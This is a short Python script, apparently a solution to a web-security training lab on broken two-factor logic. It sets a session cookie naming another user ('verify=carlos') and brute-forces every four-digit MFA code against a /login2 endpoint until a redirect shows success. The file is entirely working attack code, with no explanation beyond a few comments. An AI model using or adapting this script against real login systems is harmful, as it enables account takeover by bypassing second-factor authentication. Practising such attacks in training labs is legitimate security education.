import requests
from requests_toolbelt.utils import dump
import sys

# 2fa_broken_logic_v1 is 'better' version because of fix (not allowing redirections)

url = ''
session_key = ''
# not sure if this is correct approach but it worked
path= '/login2'

HEADERS = {'Host': url,
            'Cookie':'session='+session_key+'; verify=carlos',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': url+path,
            'Origin': url,
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin'} 


def logging_hook(response, *args, **kwargs):
    data = dump.dump_all(response)
    print(data.decode('utf-8'))

http = requests.Session()
# http.hooks["response"] = [logging_hook]


i = 0
for i in range(10000):
    # allow_redirects has to be False because if it is not request returns status code from url user is redirected to (for some unknown reason for me)
    r = http.post('https://'+url+path,headers=HEADERS, data='mfa-code='+str('{0:04}'.format(i)), allow_redirects=False)
    sys.stdout.write('\r'+str('{0:04}'.format(i)))
    sys.stdout.flush()
    if r.status_code == 302:
        print(f'status code : {r.status_code}')
        print(f'2fa code : {str("{0:04}".format(i))}')
        break